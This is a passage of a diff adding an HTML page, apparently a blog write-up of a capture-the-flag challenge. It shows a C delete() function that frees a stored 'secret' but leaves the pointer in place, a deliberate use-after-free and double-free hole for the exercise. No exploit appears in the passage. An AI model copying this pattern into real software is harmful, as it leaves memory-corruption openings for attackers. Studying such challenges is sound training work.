+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">delete</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Secret's index:"</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d%*c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;=</span> <span class="n">n_secrets</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid index"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">secrets</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Secret not digged up"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">secrets</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+
+</article>
+
+            </main><footer>
+    <div class="window-container">
+        <div class="window">
+            <div class="contacts">
+                <p><a href="https://github.com/buddurid">Github</a></p>
+                <p><a href="mailto:bbahae624@gmail.com">Email</a></p>
+                <p><a href="https://x.com/buddurid">Twitter</a></p>
+                <p><a href="https://www.linkedin.com/in/bahae-bahrini/">LinkedIn</a></p>
+                <p><a href="">Discord:#buddurid</a></p>
+                <p><a href="">CTFTime</a></p>
+            </div>
+            <p>©2024    Buddurid</p>
+        </div>
+    </div>
+    <script src="/assets/footer-fix.js"></script>
+</footer>
+</div>
+    </body>
+</html>
